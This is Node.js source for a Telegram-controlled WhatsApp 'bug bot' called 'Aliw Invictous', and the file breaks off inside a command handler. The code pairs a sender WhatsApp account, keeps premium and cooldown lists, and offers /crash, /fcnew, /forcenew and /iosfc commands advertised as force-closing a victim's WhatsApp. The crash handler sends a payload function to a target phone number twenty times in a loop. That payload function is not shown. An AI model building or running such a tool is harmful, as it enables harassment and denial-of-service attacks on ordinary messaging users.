const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/abilhrdiana23-design/roxster/refs/heads/main/token.json';
const thumbnailUrl = "https://ali-here-free-hosting.rf.gd//uploads/1790615105.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- Aliw Invictous

╰➤ INFORMATION:
 ▢ Developer: @Alihere9
 ▢ Version: 2.0 Beta
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- Aliw Invictous

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- Aliw Invictous

╰➤ INFORMATION:
 ▢ Developer: @Alihere9
 ▢ Version: 2.0 Beta
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- Aliw Invictous

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- Aliw Invictous

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><strong><tg-emoji emoji-id="5350570231863471018">👻</tg-emoji>Aliw 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 - 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼<tg-emoji emoji-id="5350570231863471018">👻</tg-emoji></strong></blockquote>
↯ Developer  : @ALIHERE9<tg-emoji emoji-id="5886352111955878352">💎</tg-emoji>
↯ Type Bug    : Bebas Spam<tg-emoji emoji-id="5819078828017849357">🤖</tg-emoji><tg-emoji emoji-id="5818920837645867167">🍏</tg-emoji>
↯ Version    : 2.0.0 pro<tg-emoji emoji-id="5350613306090482956">📊</tg-emoji>
↯ Platform   : Telegram<tg-emoji emoji-id="5454261685965572205">✈️</tg-emoji>`;


    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5260293700088511294"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5893257006323603821"
            }
        ],
        [
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/alihere9", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/aliwinc", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><strong><tg-emoji emoji-id="5350570231863471018">👻</tg-emoji>Aliw 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 - 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼<tg-emoji emoji-id="5350570231863471018">👻</tg-emoji></strong></blockquote>
↯ Developer  : @alihere9<tg-emoji emoji-id="5886352111955878352">💎</tg-emoji>
↯ Type Bug    : Bebas Spam<tg-emoji emoji-id="5819078828017849357">🤖</tg-emoji><tg-emoji emoji-id="5818920837645867167">🍏</tg-emoji>
↯ Version    : 2.0.0 pro<tg-emoji emoji-id="5350613306090482956">📊</tg-emoji>
↯ Platform   : Telegram<tg-emoji emoji-id="5454261685965572205">✈️</tg-emoji>>`;

    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5350633062940043395"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5352669672007296875"
            }
        ],
        [
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/alihere9", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/aliwinc", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><strong><tg-emoji emoji-id="5350570231863471018">👻</tg-emoji>Aliw 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 - 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼<tg-emoji emoji-id="5350570231863471018">👻</tg-emoji></strong></blockquote>
↯ Developer  : @alihere9<tg-emoji emoji-id="5886352111955878352">💎</tg-emoji>
↯ Type Bug    : Bebas Spam<tg-emoji emoji-id="5819078828017849357">🤖</tg-emoji><tg-emoji emoji-id="5818920837645867167">🍏</tg-emoji>
↯ Version    : 2.0.0 pro<tg-emoji emoji-id="5350613306090482956">📊</tg-emoji>
↯ Platform   : Telegram<tg-emoji emoji-id="5454261685965572205">✈️</tg-emoji>
<blockquote>──────────────────────────
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5350490470025816976"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><strong><tg-emoji emoji-id="5350570231863471018">👻</tg-emoji>Aliw 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 - 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼<tg-emoji emoji-id="5350570231863471018">👻</tg-emoji></strong></blockquote>
↯ Developer  : @alihere9<tg-emoji emoji-id="5886352111955878352">💎</tg-emoji>
↯ Type Bug    : Bebas Spam<tg-emoji emoji-id="5819078828017849357">🤖</tg-emoji><tg-emoji emoji-id="5818920837645867167">🍏</tg-emoji>
↯ Version    : 2.0.0 pro<tg-emoji emoji-id="5350613306090482956">📊</tg-emoji>
↯ Platform   : Telegram<tg-emoji emoji-id="5454261685965572205">✈️</tg-emoji>
<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 ⌟
┊✦ /crash - Aliw To Forclose
┊✦ /fcnew - Aliw To Forclose Hard
┊✦ /forcenew - Aliw To Forclose Hard
┊✦ /iosfc - Aliw To Forclose iOS
┊✦ /testfunction - Use Your Own Function
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5350490470025816976"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><strong><tg-emoji emoji-id="5350570231863471018">👻</tg-emoji>Aliw 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂 - 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼<tg-emoji emoji-id="5350570231863471018">👻</tg-emoji></strong></blockquote>
↯ Developer  : @alihere9<tg-emoji emoji-id="5886352111955878352">💎</tg-emoji>
↯ Type Bug    : Bebas Spam<tg-emoji emoji-id="5819078828017849357">🤖</tg-emoji><tg-emoji emoji-id="5818920837645867167">🍏</tg-emoji>
↯ Version    : 2.0.0 pro<tg-emoji emoji-id="5350613306090482956">📊</tg-emoji>
↯ Platform   : Telegram<tg-emoji emoji-id="5454261685965572205">✈️</tg-emoji>
<blockquote>──────────────────────────
#- ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘ Allah - God
┊ ⓘ Aliw - Developer
┊ ⓘ All Team Aliw
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5350490470025816976"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

//CASE BUG DISINI \\
bot.command(
  ["crash", "fcnew", "forcenew"],
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: crash
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await FcSpamX(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: crash
